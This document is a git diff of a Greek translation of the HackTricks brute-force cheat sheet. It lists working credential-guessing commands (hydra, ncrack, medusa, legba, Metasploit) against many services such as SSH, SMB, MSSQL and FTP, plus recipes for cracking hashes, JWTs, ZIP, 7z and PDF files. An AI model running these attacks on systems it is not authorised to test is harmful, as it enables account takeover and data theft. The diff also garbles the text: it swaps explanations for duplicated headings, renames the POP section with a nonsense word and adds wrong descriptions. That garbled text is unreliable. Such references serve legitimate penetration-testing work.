@@ -1,30 +1,30 @@
-# Χειροκίνητη Δύναμη - Φύλλο Απατηλών Φύλλων
+# Χτύπημα Με Βία - Φύλλο Απατηλών Φύλλων
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
-Αποκτήστε πρόσβαση σήμερα:
+Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
+Αποκτήστε Πρόσβαση Σήμερα:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Άλλοι τρόποι υποστήριξης του HackTricks:
 
 * Αν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
 ## Προεπιλεγμένα Διαπιστευτήρια
 
-**Αναζητήστε στο Google** για τα προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται, ή **δοκιμάστε αυτούς τους συνδέσμους**:
+**Αναζητήστε στο google** για τα προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται, ή **δοκιμάστε αυτούς τους συνδέσμους**:
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -54,7 +54,9 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Κορυφαίος
+### Cewl
+
+Cewl είναι ένα εργαλείο που χρησιμοποιείται για τη δημιουργία λεξικών από ιστοσελίδες. Μπορεί να χρησιμοποιηθεί για να εξάγει λέξεις κλειδιά από μια ιστοσελίδα και να τις χρησιμοποιήσει σε επιθέσεις brute-force.
 ```bash
 cewl example.com -m 5 -w words.txt
 ```
@@ -100,17 +102,17 @@ Finished in 0.920s.
 * [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 * [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
+Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
 Αποκτήστε πρόσβαση σήμερα:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Υπηρεσίες
 
-Ταξινομημένες κατά αλφαβητική σειρά ανά όνομα υπηρεσίας.
+Ταξινομημένες κατά αλφαβητική σειρά με βάση το όνομα της υπηρεσίας.
 
 ### AFP
 ```bash
@@ -124,7 +126,7 @@ msf> run
 ```
 ### AJP
 
-AJP (Apache JServ Protocol) is a binary protocol that can be used to communicate with a web server. It is often used to connect web servers with servlet containers, such as Apache Tomcat. A common attack vector against AJP is credential brute-forcing, where an attacker tries to guess usernames and passwords to gain unauthorized access to the server. It is important to use strong and unique credentials to prevent successful brute-force attacks.
+AJP (Apache JServ Protocol) is a binary protocol that can be used to proxy requests from a web server through to an application server. It is often used in conjunction with the Apache Tomcat application server. AJP is a relatively simple protocol that can be vulnerable to brute force attacks if not properly secured.
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
@@ -133,16 +135,12 @@ nmap --script ajp-brute -p 8009 <IP>
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
 ### Cassandra
-
-Η Cassandra είναι μια βάση δεδομένων NoSQL που χρησιμοποιείται για τη διαχείριση μεγάλων όγκων δεδομένων με υψηλή διαθεσιμότητα και αντοχή σε αποτυχίες.
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
 ```
 ### CouchDB
-
-Η επίθεση με βίαιη δύναμη είναι μια τεχνική που συχνά χρησιμοποιείται για να αποκτηθεί πρόσβαση σε συστήματα βάσεων δεδομένων, όπως το CouchDB. Κατά την επίθεση αυτή, ο εισβολέας δοκιμάζει συνεχώς διαφορετικά συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης μέχρι να βρει το σωστό. Εάν οι προεπιλεγμένες ρυθμίσεις ασφαλείας δεν είναι ενεργοποιημένες ή αν οι δημιουργοί χρησιμοποιούν αδύναμους κωδικούς πρόσβασης, η επίθεση με βίαιη δύναμη μπορεί να είναι επιτυχής.
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
@@ -152,16 +150,12 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
 ### Elasticsearch
-
-#### Brute Force
-
-Η επίθεση Brute Force είναι μια τεχνική που συνίσταται στο να δοκιμάζει εναλλακτικές τιμές για ονόματα χρηστών και κωδικούς πρόσβασης μέχρι να βρεθούν τα σωστά στοιχεία πιστοποίησης. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να εξακολουθήσει να δοκιμάζει συνδυασμούς χρηστών/κωδικών πρόσβασης σε μια διεπαφή Elasticsearch μέχρι να επιτευχθεί επιτυχής πρόσβαση.
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
 
-Η επίθεση με βίαιη δύναμη (brute force) στο FTP συνήθως γίνεται με το λογισμικό Hydra. Το Hydra είναι ένα εργαλείο που χρησιμοποιεί λεξικά για να δοκιμάσει πολλούς συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης. Μπορείτε να το χρησιμοποιήσετε με την εντολή `hydra -l <username> -P <wordlist> <target> ftp`.
+Η ακροδέκτης πρωτόκολλου FTP (File Transfer Protocol) είναι μια από τις πιο δημοφιλείς στόχους για επιθέσεις Brute Force.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
@@ -198,7 +192,7 @@ cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 ```
 ### IMAP
 
-Η επίθεση Brute Force στον IMAP είναι μια τεχνική που χρησιμοποιείται για να αποκτήσει πρόσβαση σε λογαριασμούς email. Ο επιτιθέμενος χρησιμοποιεί λίστα με συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης για να δοκιμάσει να συνδεθεί στον λογαριασμό IMAP.
+### IMAP
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -207,19 +201,15 @@ legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 ### IRC
 
-Το Internet Relay Chat (IRC) είναι ένα πρωτόκολλο επικοινωνίας σε πραγματικό χρόνο που χρησιμοποιείται για συνομιλίες σε ομάδες.
+Το Internet Relay Chat (IRC) είναι ένα πρωτόκολλο επικοινωνίας σε πραγματικό χρόνο που χρησιμοποιείται για συνομιλίες σε ομαδικές ή ιδιωτικές συνομιλίες μέσω καναλιών.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
-### ISCSI
-
 ### ISCSI
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
 ### JWT
-
-Το JSON Web Token (JWT) είναι ένα ασφαλές τρόπος για τη μεταφορά πληροφοριών μεταξύ δύο συστημάτων.
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
@@ -249,9 +239,7 @@ legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwor
 ```
 ### MQTT
 
-#### Επίθεση Brute Force
-
-Η επίθεση Brute Force στο πρωτόκολλο MQTT περιλαμβάνει τη δοκιμή διαφορετικών συνδυασμών ονομάτων χρήστη και κωδικών πρόσβασης μέχρι να βρεθεί ο σωστός συνδυασμός που επιτρέπει την πρόσβαση σε έναν MQTT broker. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για την παράνομη πρόσβαση σε συστήματα MQTT και την παρακολούθηση της επικοινωνίας που λαμβάνει χώρα μέσω του broker.
+### MQTT
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
@@ -264,15 +252,11 @@ legba mongodb --target localhost:27017 --username root --password data/passwords
 ```
 ### MSSQL
 
-Η επίθεση με brute force στο MSSQL γίνεται συνήθως με τη χρήση εργαλείων όπως το Hydra, το Metasploit ή το Nmap. Μπορείτε επίσης να χρησιμοποιήσετε λειτουργίες όπως το SQLMap για αυτό το σκοπό.
+### MSSQL
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
 ### MySQL
-
-#### Brute Force
-
-Brute force attacks against MySQL databases involve attempting to guess the username and password combinations to gain unauthorized access. This can be done using automated tools that systematically try all possible combinations until the correct one is found. It is important to use strong and unique credentials to protect against brute force attacks.
 ```bash
 # hydra
 hydra -L usernames.txt -P pass.txt <IP> mysql
@@ -287,8 +271,6 @@ medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on fir
 legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
 ```
 ### OracleSQL
-
-Brute-force attacks against OracleSQL databases are typically carried out using tools such as Hydra or Metasploit. These tools allow attackers to systematically try all possible combinations of usernames and passwords until the correct one is found. It is important to note that brute-force attacks can be time-consuming and resource-intensive, so they should be used as a last resort after other, less intrusive methods have been exhausted.
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
 
@@ -316,15 +298,11 @@ legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin -
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Εκτός σύνδεσης OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**εκδόσεις 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** και **11.2.0.3**):
+[Χρήση βίαιης δύναμης για αποκρυπτογράφηση κατακερματισμένου κωδικού OracleSQL εκτός σύνδεσης](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**εκδόσεις 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** και **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
-### POP
-
-#### Επίθεση Βίας
-
-Η επίθεση βίας είναι μια τεχνική που χρησιμοποιείται στον χώρο του υπολογιστικού hacking, όπου ο εισβολέας προσπαθεί να ανακαλύψει κωδικούς πρόσβασης ή κρυπτογραφημένα δεδομένα με τη δοκιμή όλων των πιθανών συνδυασμών.
+### ΤΣΑΚΑΝΑΚΙ
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -336,10 +314,6 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 ### PostgreSQL
-
-#### Βίαιη Δύναμη
-
-Η βίαιη δύναμη είναι μια τεχνική επίθεσης που στοχεύει στο να βρει τα σωστά διαπιστευτήρια εισόδου με δοκιμές διαφόρων συνδυασμών χρησιμοποιώντας λίστες κωδικών ή γεννήτριες κωδικών. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε συστήματα βάσεων δεδομένων όπως το PostgreSQL.
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -371,21 +345,21 @@ legba redis --target localhost:6379 --username admin --password data/passwords.t
 ```
 ### Rexec
 
-### Εκτέλεση αναγκαστικής εισόδου (Brute Force)
+### Εκτέλεση με Bruteforce
 
-Η τεχνική της εκτέλεσης αναγκαστικής εισόδου (Brute Force) αναφέρεται στη διαδικασία δοκιμής όλων των πιθανών συνδυασμών για να βρεθεί το σωστό συνθηματικό ή κλειδί πρόσβασης. Αυτή η μέθοδος είναι συχνά χρονοβόρα, αλλά μπορεί να είναι αποτελεσματική όταν δεν υπάρχουν άλλοι τρόποι πρόσβασης σε ένα σύστημα.
+Bruteforce είναι μια τεχνική επίθεσης που στοχεύει στο να βρει τα σωστά διαπιστευτήρια με τη δοκιμή όλων των πιθανών συνδυασμών. Αυτή η μέθοδος μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε συστήματα, λογαριασμούς ή οποιοδήποτε άλλο στοιχείο που προστατεύεται από κωδικό πρόσβασης.
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 ### Rlogin
 
-Η επίθεση Brute Force είναι μια από τις πιο δημοφιλείς τεχνικές επίθεσης εναντίον του πρωτοκόλλου Rlogin. Ο εισβολέας χρησιμοποιεί λίστα με πιθανά ονόματα χρηστών και κωδικούς πρόσβασης για να δοκιμάσει να εισέλθει στο σύστημα με τη μέθοδο της δοκιμής και σφάλματος.
+### Rlogin
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
 
-Η επίθεση Brute Force είναι μια από τις πιο απλές μεθόδους επίθεσης. Στην ουσία, ο εισβολέας δοκιμάζει όλους τους πιθανούς συνδυασμούς χρησιμοποιώντας λίστα κωδικών πρόσβασης μέχρι να βρει τον σωστό. Αυτή η τεχνική μπορεί να είναι αποτελεσματική, αλλά μπορεί να απαιτήσει πολύ χρόνο, ειδικά αν ο κωδικός πρόσβασης είναι πολύπλοκος.
+Η επίθεση Rsh (Remote Shell) είναι μια τεχνική επίθεσης που χρησιμοποιείται για να αποκτήσει ο κακόβουλος χρήστης πρόσβαση σε έναν απομακρυσμένο υπολογιστή. Συνήθως, αυτή η επίθεση εκμεταλλεύεται την αδυναμία του συστήματος στην αυθεντικοποίηση, χρησιμοποιώντας brute-force επιθέσεις για να μαντέψει τα διαπιστευτήρια του χρήστη.
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
@@ -400,16 +374,12 @@ nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/va
 hydra -l root -P passwords.txt <IP> rtsp
 ```
 ### SFTP
-
-### Υπηρεσία Ασφαλούς Μεταφοράς Αρχείων (SFTP)
 ```bash
 legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
 # Try keys from a folder
 legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 ### SNMP
-
-Η ανάλυση SNMP είναι μια τεχνική επίθεσης που στοχεύει στην εξαγωγή πληροφοριών από συσκευές που υποστηρίζουν το πρωτόκολλο SNMP.
 ```bash
 msf> use auxiliary/scanner/snmp/snmp_login
 nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
@@ -418,17 +388,13 @@ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ta
 ```
 ### SMB
 
-#### Επίθεση Brute Force
-
-Η επίθεση Brute Force είναι μια τεχνική που στοχεύει στην ανάγκη εισαγωγής όλων των πιθανών συνδυασμών κωδικών πρόσβασης μέχρι να βρεθεί ο σωστός κωδικός. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να αποκτηθεί πρόσβαση σε συστήματα SMB.
+### SMB
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
 ### SMTP
-
-Η αποστολή μηνυμάτων ηλεκτρονικού ταχυδρομείου (email) μπορεί να γίνει μέσω του πρωτοκόλλου SMTP (Simple Mail Transfer Protocol).
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
@@ -436,7 +402,7 @@ legba smtp --username admin@example.com --password wordlists/passwords.txt --tar
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) είναι ένα πρωτόκολλο που χρησιμοποιείται για τη δρομολόγηση της κυκλοφορίας δεδομένων μεταξύ πελάτη και διακομιστή μέσω ένος διακομιστή proxy. Μπορεί να χρησιμοποιηθεί για να αποκρυψει την πραγματική διεύθυνση IP του πελάτη και να παρέχει ανωνυμία κατά την περιήγηση στο διαδίκτυο.
+### SOCKS
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
@@ -444,8 +410,6 @@ legba socks5 --target localhost:1080 --username admin --password data/passwords.
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
 ### SQL Server
-
-Η επίθεση με βίαιη δύναμη είναι μια από τις πιο δημοφιλείς τεχνικές επίθεσης εναντίον των SQL Server. Οι επιτιθέμενοι χρησιμοποιούν λίστες με κοινά κωδικούς πρόσβασης ή λέξεις που χρησιμοποιούνται συχνά για να δοκιμάσουν την πρόσβαση σε λογαριασμούς χρηστών. Εάν ο SQL Server δεν έχει καλά ρυθμισμένες πολιτικές ασφαλείας, μια επίθεση με βίαιη δύναμη μπορεί να οδηγήσει σε παραβίαση του συστήματος.
 ```bash
 #Use the NetBIOS name of the machine as domain
 crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
@@ -456,7 +420,7 @@ msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts
 ```
 ### SSH
 
-SSH (Secure Shell) είναι ένα πρωτόκολλο δικτύου που χρησιμοποιείται για ασφαλή ανταλλαγή δεδομένων μεταξύ δύο συστημάτων.
+### SSH
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -468,7 +432,7 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Αδύναμα κλειδιά SSH / Προβλέψιμο PRNG του Debian
 
-Κάποια συστήματα έχουν γνωστές ελαττώσεις στον τυχαίο σπόρο που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε μειωμένο χώρο κλειδιών που μπορεί να αποδοθεί με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Επίσης, υπάρχουν προ-δημιουργημένα σύνολα αδύναμων κλειδιών όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Κάποια συστήματα έχουν γνωστές ελαττώσεις στο τυχαίο σπόρο που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε μειωμένο χώρο κλειδιών που μπορεί να αποκρυπτογραφηθεί με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Επίσης, υπάρχουν διαθέσιμα προ-δημιουργημένα σύνολα αδύναμων κλειδιών όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ και OpenMQ)
 
@@ -478,7 +442,7 @@ legba stomp --target localhost:61613 --username admin --password data/passwords.
 ```
 ### Telnet
 
-Telnet είναι ένα πρωτόκολλο δικτύου που επιτρέπει στον χρήστη να συνδεθεί σε έναν απομακρυσμένο υπολογιστή ή συσκευή και να αλληλεπιδράσει μαζί του μέσω κοινών εντολών κειμένου.
+Telnet είναι ένα πρωτόκολλο δικτύου που επιτρέπει την απομακρυσμένη πρόσβαση σε άλλους υπολογιστές στο διαδίκτυο ή το τοπικό δίκτυο.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -493,8 +457,6 @@ legba telnet \
 --telnet-prompt ":~$ " \
 --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
 ```
-### VNC
-
 ### VNC
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
@@ -514,31 +476,31 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να κατασκευάσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
+Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
 Αποκτήστε πρόσβαση σήμερα:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Τοπικά
 
-### Online βάσεις δεδομένων αποκρυπτογράφησης
+### Online βάσεις δεδομένων για αποκρυπτογράφηση
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
 * [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 με/χωρίς ESS/SSP και με οποιαδήποτε τιμή πρόκλησης)
 * [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Κρυπτογραφημένα hashes, αιχμές WPA2, και αρχεία MSOffice, ZIP, PDF...)
-* [https://crackstation.net/](https://crackstation.net) (Κρυπτογραφημένα hashes)
+* [https://crackstation.net/](https://crackstation.net) (Hashes)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-* [https://gpuhash.me/](https://gpuhash.me) (Κρυπτογραφημένα hashes και αρχεία)
-* [https://hashes.org/search.php](https://hashes.org/search.php) (Κρυπτογραφημένα hashes)
-* [https://www.cmd5.org/](https://www.cmd5.org) (Κρυπτογραφημένα hashes)
+* [https://gpuhash.me/](https://gpuhash.me) (Hashes και κρυπτογραφημένα αρχεία)
+* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
+* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 * [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Ελέγξτε αυτό πριν δοκιμάσετε να εκτελέσετε μια επίθεση brute force σε ένα Hash.
+Ελέγξτε αυτό πριν δοκιμάσετε να κάνετε brute force ενός Hash.
 
 ### ZIP
 ```bash
@@ -556,7 +518,7 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Επίθεση γνωστού κειμένου σε αρχείο zip
+#### Επίθεση με γνωστό κείμενο σε συμπίεση zip
 
 Χρειάζεστε να γνωρίζετε το **καθαρό κείμενο** (ή μέρος του καθαρού κειμένου) **ενός αρχείου που περιέχεται μέσα** στο κρυπτογραφημένο zip. Μπορείτε να ελέγξετε τα **ονόματα αρχείων και το μέγεθος των αρχείων που περιέχονται μέσα** σε ένα κρυπτογραφημένο zip τρέχοντας: **`7z l encrypted.zip`**\
 Κατεβάστε το [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) από τη σελίδα κυκλοφορίας.
@@ -572,10 +534,6 @@ zip plaintext.zip plaintext.file
 unzip unlocked.zip #User new_pwd as password
 ```
 ### 7z
-
-#### Επίθεση Brute Force
-
-Η επίθεση Brute Force είναι μια τεχνική που στοχεύει στο να δοκιμάσει όλους τους πιθανούς συνδυασμούς κωδικών πρόσβασης μέχρι να βρει το σωστό. Στην περίπτωση του 7z, μπορεί να χρησιμοποιηθεί για να αποκρυπτογραφήσει αρχεία που είναι κρυπτογραφημένα με κωδικό πρόσβασης. Οι επιθέσεις Brute Force μπορεί να είναι χρονοβόρες, αλλά με τη χρήση ισχυρών υπολογιστικών πόρων μπορεί να είναι επιτυχημένες.
 ```bash
 cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
 ```
@@ -588,7 +546,7 @@ apt-get install libcompress-raw-lzma-perl
 ```
 ### PDF
 
-Η επίθεση με βίαιη εξαναγκαστική δύναμη είναι μια τεχνική που χρησιμοποιείται για την ανάλυση των κωδικών πρόσβασης με τη δοκιμή όλων των πιθανών συνδυασμών. Αυτή η μέθοδος είναι αποτελεσματική αλλά χρονοβόρα, καθώς απαιτεί τη δοκιμή όλων των πιθανών συνδυασμών κωδικών.
+### PDF
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -599,7 +557,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### Κωδικός Ιδιοκτήτη PDF
 
